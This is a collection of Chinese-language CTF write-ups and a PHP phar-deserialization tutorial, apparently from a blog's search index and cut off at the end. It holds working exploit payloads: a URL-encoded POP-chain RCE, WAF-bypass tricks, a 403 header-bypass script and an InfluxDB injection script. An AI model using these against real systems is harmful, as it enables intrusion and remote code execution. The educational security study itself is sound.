\u0026#39;xiuxiuxiu\u0026#39;; } public function __toString(){ echo \u0026#34;__toString\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if ($this-\u0026gt;chu0===$this-\u0026gt;chu1){ $content=\u0026#39;ctfshowshowshowwww\u0026#39;.$_GET[\u0026#39;chu0\u0026#39;]; if (!waf_in_waf_php($_GET[\u0026#39;name\u0026#39;])){ file_put_contents($_GET[\u0026#39;name\u0026#39;].\u0026#34;.txt\u0026#34;,$content); }else{ echo \u0026#34;绕一下吧孩子\u0026#34;; } $tmp = file_get_contents(\u0026#39;ctfw.txt\u0026#39;); echo $tmp.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if (!preg_match(\u0026#34;/f|l|a|g|x|\\*|\\?|\\[|\\]| |\\\u0026#39;|\\\u0026lt;|\\\u0026gt;|\\%/i\u0026#34;,$_GET[\u0026#39;cmd\u0026#39;])){ eval($tmp($_GET[\u0026#39;cmd\u0026#39;])); }else{ echo \u0026#34;waf!\u0026#34;; } file_put_contents(\u0026#34;ctfw.txt\u0026#34;,\u0026#34;\u0026#34;); } return \u0026#34;Go on\u0026#34;; } } if (!$_GET[\u0026#39;show_show.show\u0026#39;]){ echo \u0026#34;开胃小菜，就让我成为签到题叭\u0026#34;; highlight_file(__FILE__); }else{ echo \u0026#34;WAF,启动！\u0026#34;; waf1($_REQUEST); waf2($_SERVER[\u0026#39;QUERY_STRING\u0026#39;]); if (!preg_match(\u0026#39;/^[Oa]:[\\d]/i\u0026#39;,$_GET[\u0026#39;show_show.show\u0026#39;])){ unserialize($_GET[\u0026#39;show_show.show\u0026#39;]); }else{ echo \u0026#34;被waf啦\u0026#34;; } } 可以看见这里有两个waf在入口，\nwaf1 #\rfunction waf1($Chu0){ foreach ($Chu0 as $name =\u0026gt; $value) { if(preg_match(\u0026#39;/[a-z]/i\u0026#39;, $value)){ exit(\u0026#34;waf1\u0026#34;); } } } 对参数进行正则匹配(匹配了a-z大小写)，如果匹配到字母则退出并回显waf1 然后传入的时候是$REQUEST ，有一个特性。这里我们可以做一个测试\n实例 #\r\u0026lt;?php $a = $_REQUEST; var_dump($a); ?\u0026gt; 当我们使用GET进行传参的时候便输出\narray(1) { [\u0026#34;a\u0026#34;]=\u0026gt; string(1) \u0026#34;2\u0026#34; } 当再使用POST的时候\narray(2) { [\u0026#34;a\u0026#34;]=\u0026gt; string(1) \u0026#34;2\u0026#34; [\u0026#34;b\u0026#34;]=\u0026gt; string(1) \u0026#34;1\u0026#34; } 那么如果我让GET和PPOST进行同时传同一个参数就是（GET的值为2，POST的值为10000）：\narray(1) { [\u0026#34;a\u0026#34;]=\u0026gt; string(5) \u0026#34;10000\u0026#34; } 可以看见这里是直接获取了post的参数，也就是他的特性就是当变量名相同的时候会先获取POST的内容 那么这个地方就可以利用这个特性绕过\nwaf2 #\rfunction waf2($Chu0){ if(preg_match(\u0026#39;/show/i\u0026#39;, $Chu0)) exit(\u0026#34;waf2\u0026#34;); } 正则匹配字符串show(不区分大小写)，如果匹配到则退出返回waf2 调用处是waf2($_SERVER['QUERY_STRING']);，它用于获取当前请求的查询字符串部分。查询字符串是位于 URL 中 ? 符号之后的部分，包含了以键值对形式传递的参数。所以我们可以url编码绕过即可\nwaf_in_waf_php #\rfunction waf_in_waf_php($a){ $count = substr_count($a,\u0026#39;base64\u0026#39;); echo \u0026#34;hinthinthint,base64喔\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if($count!=1){ return True; } if (preg_match(\u0026#39;/ucs-2|phar|data|input|zip|flag|\\%/i\u0026#39;,$a)){ return True; }else{ return false; } } 利用了substr_count进行计算base64出现的次数 要求base64的出现次数不能大于一次，然后进行一些正则 链子比较简单：\nctf() __destruct -\u0026gt; show() __call -\u0026gt; Chu0_write __toString 基础的pop：\n\u0026lt;?php class ctf{ public $h1; public $h2; } class show{ } class Chu0_write{ public $chu0; public $chu1; public $cmd; } $a=new ctf(); $a-\u0026gt;h1=new show(); $a-\u0026gt;h2=[[2=\u0026gt;new Chu0_write()]]; //利用preg_match触发 echo serialize($a); 这样就到了RCE的地方了 接下来的构造可以看一下这篇文章： https://tttang.com/archive/1395/#toc_garbage-string 这里放出一个转化的脚本：\n\u0026lt;?php $cmd =\u0026#39;system\u0026#39;; $payload = iconv(\u0026#39;utf-8\u0026#39;, \u0026#39;utf-16\u0026#39;, base64_encode($cmd)); file_put_contents(\u0026#39;payload.txt\u0026#39;, quoted_printable_encode($payload)); $result = file_get_contents(\u0026#39;payload.txt\u0026#39;); $result = preg_replace(\u0026#39;/=\\r\\n/\u0026#39;, \u0026#39;\u0026#39;, $result); echo $result; 这里为什么这么写看完上面的文章就知道，是为了利用base64的正则过程搭配iconv的编码转化来构造出自己想要的东西，这里指的就是system了 然后后面输入的时候把它反过来即可 也就是：\nname=php://filter/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw 从而让后面的chu0拼接后形成system 最后读一下环境变量即可 playload: GET :?%73%68%6f%77[%73%68%6f%77.%73%68%6f%77=%43%3a%31%31%3a%22%41%72%72%61%79%4f%62%6a%65%63%74%22%3a%31%36%34%3a%7b%78%3a%69%3a%30%3b%61%3a%31%3a%7b%73%3a%39%3a%22%67%78%6e%67%78%6e%67%78%6e%22%3b%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%31%3a%7b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%4e%3b%73%3a%34%3a%22%63%68%75%31%22%3b%4e%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%7d%3b%6d%3a%61%3a%30%3a%7b%7d%7d\u0026amp;name=php://filter/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw\u0026amp;chu0=c=003=00l=00z=00d=00G=00V=00t=00\u0026amp;cmd=env\nPOST：show[show.show=1\u0026amp;name=1\u0026amp;chu0=1\u0026amp;cmd=1 (关于为什么这里的下划线要换成[这个我前面的文章也有写到过)\neazy_login #\r这个是以前的题目了，github上面都有源码 https://blog.csdn.net/m0_73512445/article/details/134879829\n参考文章： https://blog.csdn.net/m0_64016126/article/details/135368226\n","date":"25 January 2024","externalUrl":null,"permalink":"/posts/ctfshow-yuandan/","section":"Posts","summary":"","title":"CTFshow元旦水友赛部分wp-web","type":"posts"},{"content":"Levi Ackerman #\r题目提示有robot，所以直接robots.txt /l3v1_4ck3rm4n.html 直接访问 KCTF{1m_d01n6_17_b3c4u53_1_h4v3_70}\nkitty #\r进来之后想到万能密码直接登录 Dashboard中查看源代码看见 所以这里直接写入 cat flag.txt KCTF{Fram3S_n3vE9_L1e_4_toGEtH3R}\nGain Access 1 #\r进入也是一个登录页面，然后在注释看见了账号： root@knightctf.com 这里又刚好有一个忘记密码，然后试着抓返回包看看有没有什么东西返回 这里看见返回了一个token，但是该如何利用呢？ 在文件robots.txt发现有个路径/r3s3t_pa5s.php所以访问一下发现需要token，所以这里token直接带进去 可以看到进入了重置密码改完之后登录就有flag了 KCTF{ACc0uNT_tAk3Over}\nReadme #\r进来可以看见是个读文件的东东， import requests URL = \u0026#39;http://66.228.53.87:8989/\u0026#39; file = \u0026#34;text.txt\u0026#34; req = requests.get(f\u0026#39;{URL}fetch?file={file}\u0026#39;) print(req.text) {\u0026ldquo;result\u0026rdquo;:\u0026ldquo;Yes! You can read files! Dont ask for hint its ezz!!\u0026rdquo;} 然后这里读flag.txt的时候出了问题 {\u0026ldquo;result\u0026rdquo;:\u0026ldquo;403 Access Denied\u0026rdquo;} 然后这里的绕过方式就是伪造hearder 文章： https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses 这里附上完整脚本\nimport requests URL = \u0026#39;http://66.228.53.87:8989/\u0026#39; file = \u0026#34;flag.txt\u0026#34; # headers to bypass 403 Access Denied error headers = { \u0026#39;X-Originating-IP\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;X-Forwarded-For\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;X-Forwarded\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;Forwarded-For\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;X-Remote-IP\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;X-Remote-Addr\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;X-ProxyUser-Ip\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;X-Original-URL\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;Client-IP\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;True-Client-IP\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;Cluster-Client-IP\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;X-ProxyUser-Ip\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;Host\u0026#39;: \u0026#39;localhost\u0026#39; } req = requests.get(f\u0026#39;{URL}fetch?file={file}\u0026#39;, headers=headers) print(req.text) {\u0026ldquo;result\u0026rdquo;:\u0026ldquo;KCTF{kud05w3lld0n3!}\u0026rdquo;}\nFluxx（后面看wp复现的） #\rwp adress :https://ctftime.org/writeup/38522\n进来可以看见需要添加需要查询的参数，我们把参数加上 http://66.228.53.87:9001/query?data=111 但是没啥东西,但是看到query，想着能不能注入一下 playload:http://66.228.53.87:9001/query?data=1%22%20or%201=1\u0026ndash;+\n返回：HttpError: compilation failed: error @1:82-1:159: expected RPAREN, got EOF error @1:152-1:153: invalid expression @1:151-1:152: = error @1:156-1:159: got unexpected token in string expression @1:159-1:159: EOF\n在文章： https://community.influxdata.com/t/query-throws-rparen-got-eof-error/18940 可以看见错误 所以可以知道是InfluxDB nosql注入（参考文章 https://rafa.hashnode.dev/influxdb-nosql-injection） 最后的exp\nimport requests, urllib.parse base_URL = \u0026#39;http://66.228.53.87:9001/\u0026#39; letters = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; for char in list(letters): payload = f\u0026#39;\u0026#34;) |\u0026gt; yield(name: \u0026#34;1337\u0026#34;)\\nbuckets() |\u0026gt; filter(fn: (r) =\u0026gt; r.name =~ /^{char}.*/ and die(msg:r.name))\\n//\u0026#39; encoded_payload = urllib.parse.quote(payload, safe=\u0026#39;\u0026#39;) req = requests.get(f\u0026#39;{base_URL}query?data={encoded_payload}\u0026#39;) if req.text != \u0026#39;[]\u0026#39;: print(req.text) HttpError: runtime error @2:14-2:69: filter: failed to evaluate filter function: KCTF{g0UPqVWa0eUT2wF2ipzX3v5pxikvqYhxR9OL}\ngain acess2 #\r进来还是一个login页面。然后看见有一个文件notesssssss.txt 文件内容:\nI\u0026#39;ve something for you. Think..... root@knightctf.com:d05fcd90ca236d294384abd00ca98a2d 后面的看起来像md5所以就直接扔进去查-\u0026gt;letmein_kctf2024 直接登录，发现有一个OTP认证并且有一个resend的功能，然后和access1的有点像，但是这里没返回token 但是抓包发现这里是以json方法进行传输的，所以就思考能不能同时发给两个邮箱 构造：\n{ \u0026#34;email\u0026#34;: [\u0026#34;root@knightctf.com\u0026#34;,\u0026#34;attacker@email.com\u0026#34;] } 可以看见otp发过来了，直接登录后就获取flag了 Here is your flag: KCTF{AuTh_MIsC0nFigUraTi0N}\n","date":"22 January 2024","externalUrl":null,"permalink":"/posts/knightctf2024/","section":"Posts","summary":"","title":"Knightctf 2024 WP","type":"posts"},{"content":"","date":"17 January 2024","externalUrl":null,"permalink":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","section":"Tags","summary":"","title":"反序列化","type":"tags"},{"content":"Phar反序列化 #\r参考文章： 1、#https://aecous.github.io/2023/04/24/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-phar%E7%AF%87/ 2、#https://xz.aliyun.com/t/6699?time__1311=n4%2BxnD0DRDBGit30%3DKDsA3r%2BDcAiD9DQqwxvID\u0026amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6699#toc-3 3、#https://boogipop.com/2023/07/08/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6%E4%B8%80%E7%B3%BB%E5%88%97%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/\n0x01 什么是phar？ #\rPhar是PHP的压缩文档，是PHP中类似于JAR的一种打包文件。它可以把多个文件存放至同一个文件中，无需解压，PHP就可以进行访问并执行内部语句。 默认开启版本 PHP version \u0026gt;= 5.3\n0x02关于phar的一些知识 #\rphar的文件结构 #\r1、Stub\t//Phar文件头 2、manifest\t//压缩文件信息 3、contents\t//压缩文件内容 4、signature\t//签名 Stub #\rstub是phar的文件头，如果没有这个就无法被识别为phar文件（但是不影响伪造成其他文件：gif、png、jpg and so on）\n\u0026lt;?php xxx; __HALT_COMPILER();?\u0026gt; 利用一些构造手法可以进行绕过\nmanifest （manifest describing the contents） #\rphar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。【引用】\ncontents（the file contents） #\r被压缩文件的内容。\nsignature([optional] a signature for verifying Phar integrity (phar file format only)) #\r就是phar文件的签名，每次文件内容更改的时候都要重新生成新的签名 可以看见\n20bytes =\u0026gt; SHA1 0x0002 16bytes =\u0026gt; MD5 32bytes =\u0026gt; SHA256 0x0003 64bytes =\u0026gt; SHA512 0x0004 from hashlib import sha1 with open(\u0026#39;test.phar\u0026#39;, \u0026#39;rb\u0026#39;) as file: f = file.read() s = f[:-28] # 获取要签名的数据 h = f[-8:] # 获取签名类型和GBMB标识 newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB) with open(\u0026#39;newtest.phar\u0026#39;, \u0026#39;wb\u0026#39;) as file: file.write(newf) # 写入新文件 demo #\r注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。\n\u0026lt;?php class DTtest{ } @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //后缀名必须为phar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //设置stub $o = new DTtest(); $phar-\u0026gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //添加要压缩的文件 $phar-\u0026gt;stopBuffering(); ?\u0026gt; 可以看见他的存储方式也是以反序列化的形式存在的\ndemo2 #\r\u0026lt;?php class DTtest { } @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //后缀名必须为phar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;GIF89a\u0026#34;.\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //设置stub $o = new DTtest(); $o-\u0026gt;data=\u0026#39;hello DT!\u0026#39;; $phar-\u0026gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //添加要压缩的文件 //签名自动计算 $phar-\u0026gt;stopBuffering(); ?\u0026gt; 可以看见这里也是可以伪造了一个jpg的头文件 测试了一下也是可以构造链子的，这里就不演示了\n\u0026lt;?php include(\u0026#39;phar://phar.jpg\u0026#39;); class DTtest { function __destruct() { echo $this-\u0026gt;data; echo phpinfo(); } } ?\u0026gt; 0x03触发函数 #\r为什么 Phar 会反序列化处理文件并且在文件操作中能够成功反序列化呢？\nStream API #\rhttps://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L548 ，重点关注：\nstream = php_stream_open_wrapper_ex(filename, \u0026#34;rb\u0026#34;, (use_include_path ? USE_PATH : 0) | REPORT_ERRORS, NULL, context); 可以注意，其使用的是php_stream系列API来打开一个文件。 官方文档： https://www.php.net/manual/en/book.stream.php ，可知，Stream API是PHP中一种统一的处理文件的方法，并且其被设计为可扩展的，允许任意扩展作者使用。这个phar就注册了phar://这个stream wrapper，可以看看注册了什么wrapper\nphp \u0026gt; var_dump(stream_get_wrappers()); array(12) { [0]=\u0026gt; string(5) \u0026#34;https\u0026#34; [1]=\u0026gt; string(4) \u0026#34;ftps\u0026#34; [2]=\u0026gt; string(13) \u0026#34;compress.zlib\u0026#34; [3]=\u0026gt; string(14) \u0026#34;compress.bzip2\u0026#34; [4]=\u0026gt; string(3) \u0026#34;php\u0026#34; [5]=\u0026gt; string(4) \u0026#34;file\u0026#34; [6]=\u0026gt; string(4) \u0026#34;glob\u0026#34; [7]=\u0026gt; string(4) \u0026#34;data\u0026#34; [8]=\u0026gt; string(4) \u0026#34;http\u0026#34; [9]=\u0026gt; string(3) \u0026#34;ftp\u0026#34; [10]=\u0026gt; string(4) \u0026#34;phar\u0026#34; [11]=\u0026gt; string(3) \u0026#34;zip\u0026#34; } 注册wapper可以实现功能，具体看底层代码： https://github.com/php/php-src/blob/8d3f8ca12a0b00f2a74a27424790222536235502/main/php_streams.h#L132\ntypedef struct _php_stream_wrapper_ops { /* open/create a wrapped stream */ php_stream *(*stream_opener)(php_stream_wrapper *wrapper, const char *filename, const char *mode, int options, zend_string **opened_path, php_stream_context *context STREAMS_DC); /* close/destroy a wrapped stream */ int (*stream_closer)(php_stream_wrapper *wrapper, php_stream *stream); /* stat a wrapped stream */ int (*stream_stat)(php_stream_wrapper *wrapper, php_stream *stream, php_stream_statbuf *ssb); /* stat a URL */ int (*url_stat)(php_stream_wrapper *wrapper, const char *url, int flags, php_stream_statbuf *ssb, php_stream_context *context); /* open a \u0026#34;directory\u0026#34; stream */ php_stream *(*dir_opener)(php_stream_wrapper *wrapper, const char *filename, const char *mode, int options, zend_string **opened_path, php_stream_context *context STREAMS_DC); const char *label; /* delete a file */ int (*unlink)(php_stream_wrapper *wrapper, const char *url, int options, php_stream_context *context); /* rename a file */ int (*rename)(php_stream_wrapper *wrapper, const char *url_from, const char *url_to, int options, php_stream_context *context); /* Create/Remove directory */ int (*stream_mkdir)(php_stream_wrapper *wrapper, const char *url, int mode, int options, php_stream_context *context); int (*stream_rmdir)(php_stream_wrapper *wrapper, const char *url, int options, php_stream_context *context); /* Metadata handling */ int (*stream_metadata)(php_stream_wrapper *wrapper, const char *url, int options, void *value, php_stream_context *context); } php_stream_wrapper_ops; 可以看见拥有： stream_opener,stream_closer,stream_stat,url_stat,dir_opener,unlink,rename,stream_mkdir,stream_metadata 这几个功能 404实验室seaii指出了所有文件函数均可使用\nfileatime / filectime / filemtime stat / fileinode / fileowner / filegroup / fileperms file / file_get_contents / readfile / `fopen`` file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable parse_ini_file unlink copy 根据文章的分析，可以看见，其原理都是调用了 php_stream_locate_url_wrapper这个函数，都是直接或者间接的触发反序列化的wrapper。 接下来是一些touch文件 exif #\rexif_thumbnail exif_imagetype gd #\rimageloadfont imagecreatefrom*** hash #\rhash_hmac_file hash_file hash_update_file md5_file sha1_file file / url #\rget_meta_tags get_headers standard #\rgetimagesize getimagesizefromstring zip #\r$zip = new ZipArchive(); $res = $zip-\u0026gt;open(\u0026#39;c.zip\u0026#39;); $zip-\u0026gt;extractTo(\u0026#39;phar://test.phar/test\u0026#39;); Bzip / Gzip(可用于bypass phar://的情况) #\rdemo:\n$z = \u0026#39;compress.bzip2://phar:///home/sx/test.phar/test.txt\u0026#39;; 当然，它同样适用于compress.zlib://。\npostgres #\r\u0026lt;?php $pdo = new PDO(sprintf(\u0026#34;pgsql:host=%s;dbname=%s;user=%s;password=%s\u0026#34;, \u0026#34;127.0.0.1\u0026#34;, \u0026#34;postgres\u0026#34;, \u0026#34;sx\u0026#34;, \u0026#34;123456\u0026#34;)); @$pdo-\u0026gt;pgsqlCopyFromFile(\u0026#39;aa\u0026#39;, \u0026#39;phar://test.phar/aa\u0026#39;); Mysql #\rMysql的load data local infile也会触发php_stream_open_wrapper\n\u0026lt;?php class A { public $s = \u0026#39;\u0026#39;; public function __wakeup () { system($this-\u0026gt;s); } } $m = mysqli_init(); mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true); $s = mysqli_real_connect($m, \u0026#39;localhost\u0026#39;, \u0026#39;root\u0026#39;, \u0026#39;123456\u0026#39;, \u0026#39;easyweb\u0026#39;, 3306); $p = mysqli_query($m, \u0026#39;LOAD DATA LOCAL INFILE \\\u0026#39;phar://test.phar/test\\\u0026#39; INTO TABLE a LINES TERMINATED BY \\\u0026#39;\\r\\n\\\u0026#39; IGNORE 1 LINES;\u0026#39;); 0x04一些bypass #\r常规bypass #\r后缀名phar ban #\r当phar这个后缀名被ban的时候，可以直接对后缀进行更改，不会影响到协议的读取，因为根据前面stub来判断phar，例如前面构造的jpg来绕过一些限制。拿上面的举个例子。 stub ban #\r如果ban了stub头，那么可以将phar文件进行一次压缩，建议使用linux的自带压缩gzip，使用windows的bandzip等会导致算法问题无法触发\ngzip 1.zip 1.phar 如果无法用phar协议，那么就可以用下面的\ncompress.zlib://phar://phar.phar/test.txt 这里我写一个例子出来： demo: a.php\n\u0026lt;?php class DTtest{ } @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //后缀名必须为phar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;GIF89a\u0026#34;.\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //设置stub $o = new DTtest(); $phar-\u0026gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //添加要压缩的文件 $phar-\u0026gt;stopBuffering(); ?\u0026gt; phar.php\n\u0026lt;?php highlight_file(__FILE__); error_reporting(0); $a = $_GET[\u0026#39;filename\u0026#39;]; if(substr($a, 0,7) == \u0026#34;phar://\u0026#34; \u0026amp;\u0026amp; isset($a)){ die(nonono); }else{ include $a; } class DTtest{ public function __destruct(){ echo $this-\u0026gt;data; echo phpinfo(); } } ?\u0026gt; 这里为了简便就不写对后缀名的限制了，但是我这里还是上传gif文件。 playlaod:http://127.0.0.1/phar.php?filename=compress.zlib://phar://phar.gif 同样的zip协议我就不写了\n绕过__\\wakeup #\rphp版本 PHP5\u0026lt;5.6.25，PHP7 \u0026lt; 7.0.10 在正常的反序列化漏洞中，都知道，可以通过改变成员数来绕过wakeup（）（具体为什么我后面再去分析），所以在phar反序列化中一样，这里直接给出demo\n\u0026lt;?php class DTtest{ } @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //后缀名必须为phar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;GIF89a\u0026#34;.\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //设置stub $o = new DTtest(); str_replace(\u0026#34;O:6:\u0026#34;DTtest:1\u0026#34;,\u0026#34;O:6:\u0026#34;DTtest\u0026#34;:2,$o); $phar-\u0026gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //添加要压缩的文件 $phar-\u0026gt;stopBuffering(); ?\u0026gt; 后面自动计算签名即可 另外一个方式（当php版本对应不上且含有__destruct方法的时候）可以使用GC回收机制来直接触发销毁方法从而绕过wakeup 或者可以利用aecous师傅写的：\nfrom hashlib import sha1 file = open(\u0026#39;test.phar\u0026#39;, \u0026#39;rb\u0026#39;).read() # 需要重新生成签名的phar文件 data = file[:-28] # 获取需要签名的据 final = file[-8:] # 获取最后8位GBMB标识和签名类型 newfile = data + sha1(data).digest() + final # 数据 + 签名 + 类型 + GBMB open(\u0026#39;poc.phar\u0026#39;, \u0026#39;wb\u0026#39;).write(newfile) # 写入到新的phar文件 来进行绕i过\n绕过头部脏数据 #\r这里我也就直接贴上上面师傅的代码下来了 当文件上传之后，在文件数据前面拼接了脏数据，再进行文件函数配合phar协议读取时，就会因为签名原因导致无法反序列化，这种情况下，就需要在生成phar文件时，将已知的脏数据设置在stub中，计算完签名后将文件中的脏数据删除即可\n\u0026lt;?php class A{ } $a=new A(); //前面的脏数据 $dirtydata = \u0026#34;dirty\u0026#34;; $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); //在stub头中添加脏数据 $phar-\u0026gt;setStub($dirtydata.\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); $phar-\u0026gt;setMetadata($a); //添加压缩文件 $phar-\u0026gt;addFromString(\u0026#34;anything\u0026#34; , \u0026#34;test\u0026#34;); //自动计算签名 $phar-\u0026gt;stopBuffering(); //读取phar文件 $exp = file_get_contents(\u0026#34;./phar.phar\u0026#34;); $post_exp = substr($exp, strlen($dirtydata)); //删除脏数据头 $exp = file_put_contents(\u0026#34;./break_phar.phar\u0026#34;,$post_exp); ?\u0026gt; 测试：\n\u0026lt;?php class A{ public function __destruct() { echo \u0026#34;AAAA\u0026#34;; } } $dirty=\u0026#34;dirty\u0026#34;; $old=file_get_contents(\u0026#34;./phar/break_phar.phar\u0026#34;); $new=$old.$dirty; $new= $dirty.$old; file_put_contents(\u0026#34;./phar/new.phar\u0026#34;,$new); file_get_contents(\u0026#34;phar://./phar/new.phar\u0026#34;); 绕过尾部脏数据 #\r绕过文件尾部的脏数据就不需要什么操作了，也不需要已知内容，我们可以使用tar格式自动忽略，因为tar格式有暂停解析位，在之后添加的数据都不会解析的。\n\u0026lt;?php class A{ } $a=new A(); //因为用的tar格式，所以不需要指定stub头 $phar = new PharData(dirname(__FILE__) . \u0026#34;/phar.tar\u0026#34;, 0, \u0026#34;phartest\u0026#34;, Phar::TAR); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setMetadata($a); $phar-\u0026gt;addFromString(\u0026#34;test\u0026#34; , \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering(); \u0026lt;?php class A{ public function __destruct() { echo \u0026#34;AAAA\u0026#34;; } } $dirty=\u0026#34;dirty\u0026#34;; $old=file_get_contents(\u0026#34;./phar/phar.tar\u0026#34;); $new=$old.$dirty; file_put_contents(\u0026#34;./phar/new.tar\u0026#34;,$new); file_get_contents(\u0026#34;phar://./phar/new.tar\u0026#34;); 绕过前后脏数据 #\r\u0026lt;?php class A{ } $a=new A(); //前面的脏数据 $dirtydata=\u0026#34;dirty\u0026#34;; $phar = new PharData(dirname(__FILE__) . \u0026#34;/phar.tar\u0026#34;, 0, \u0026#34;phartest\u0026#34;, Phar::TAR); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setMetadata($a); //设置开头数据 $phar-\u0026gt;addFromString($dirtydata , \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering(); //读取原文件，截取，删除 $exp = file_get_contents(\u0026#34;./phar.tar\u0026#34;); $post_exp = substr($exp, strlen($dirtydata)); $exp = file_put_contents(\u0026#34;./break_phar.tar\u0026#34;,$post_exp); ?\u0026gt; \u0026lt;?php class A{ public function __destruct() { echo \u0026#34;AAA\u0026#34;; } } $front=\u0026#34;dirty\u0026#34;; $dirty=\u0026#34;dirty\u0026#34;; $old=file_get_contents(\u0026#34;./phar/break_phar.tar\u0026#34;); $new=$front.$old.$dirty; file_put_contents(\u0026#34;./phar/new.tar\u0026#34;,$new); file_get_contents(\u0026#34;phar://./phar/new.tar\u0026#34;); ","date":"17 January 2024","externalUrl":null,"permalink":"/posts/phar/","section":"Posts","summary":"","title":"反序列化-phar","type":"posts"},{"content":"没想到吧，又是lolita师傅出的题 因为当时N1CTF没解出来，所以找了lolita师傅开了个环境复现一下，在此特别感谢lolita师傅\n进来还是直接load_file()\n\u0026lt;?php //for n1ctf ezmariadb secret cmd if ($_REQUEST[\u0026#34;secret\u0026#34;] === \u0026#34;lolita_love_you_forever\u0026#34;){ header(\u0026#34;Content-Type: text/plain\u0026#34;); echo \u0026#34;\\\\n\\\\n`ps -ef` result\\\\n\\\\n\u0026#34;; system(\u0026#34;ps -ef\u0026#34;); echo \u0026#34;\\\\n\\\\n`ls -l /` result\\\\n\\\\n\u0026#34;; system(\u0026#34;ls -l /\u0026#34;); echo \u0026#34;\\\\n\\\\n`ls -l /var/www/html/` result\\\\n\\\\n\u0026#34;; system(\u0026#34;ls -l /var/www/html/\u0026#34;); echo \u0026#34;\\\\n\\\\n`find /mysql` result\\\\n\\\\n\u0026#34;; system(\u0026#34;find /mysql\u0026#34;); die(\u0026#34;can you get shell?\u0026#34;); } //lolita init db $servername = \u0026#34;127.0.0.1\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;123456\u0026#34;; $dbn = \u0026#34;ctf\u0026#34;; //phpinfo(); //die(); // 创建连接 //$conn = new PDO(\u0026#34;mysql:host=$servername;\u0026#34;, $username, $password); //aaa(); $err = \u0026#34;\u0026#34;; try { //$conn = new PDO(\u0026#34;mysql:host=$servername;dbname=$dbn\u0026#34;, $username, $password); $conn = new mysqli($servername, $username, $password, $dbn); //echo \u0026#34;连接成功\u0026#34;; } catch(PDOException $e) { //echo 